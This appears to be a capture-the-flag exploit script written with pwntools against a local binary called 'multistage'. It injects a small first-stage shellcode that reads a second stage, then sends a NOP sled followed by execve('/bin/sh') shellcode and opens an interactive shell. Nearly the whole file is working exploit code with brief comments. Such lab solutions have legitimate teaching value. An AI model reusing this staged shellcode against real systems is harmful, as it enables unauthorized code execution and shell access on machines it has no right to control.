from pwn import *

context.arch = "amd64"

COMMANDS = '''
b *0x000000000040123f
c
'''

if args.REMOTE:
    pass
else:
    if args.GDB:
       r = gdb.debug("./multistage", gdbscript=COMMANDS)
    else:
        r = process("./multistage") 

#we have only 16 bytes for the first shellcode

#shellcode2 is a simple execve on /bin/sh\x00
shellcode2 = '''
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov rdi, 0x0068732f6e69622f
push rdi
mov rdi, rsp
xor rax, rax
xor rsi, rsi
xor rdx, rdx
mov al, 0x3b
syscall
'''
shellcode2_c = asm(shellcode2)

#i have the buffer on rax, i push it in the stack and i pop it in rsi to perform the read, dx is the subregister of rdx and it is used to save space 

shellcode1 = '''
push rax
pop rsi
xor rax, rax
xor rdi, rdi
add dx, 0x80
syscall
'''
shellcode1_c = asm(shellcode1)

r.send(shellcode1_c)
input("wait")
r.send(shellcode2_c)

r.interactive()
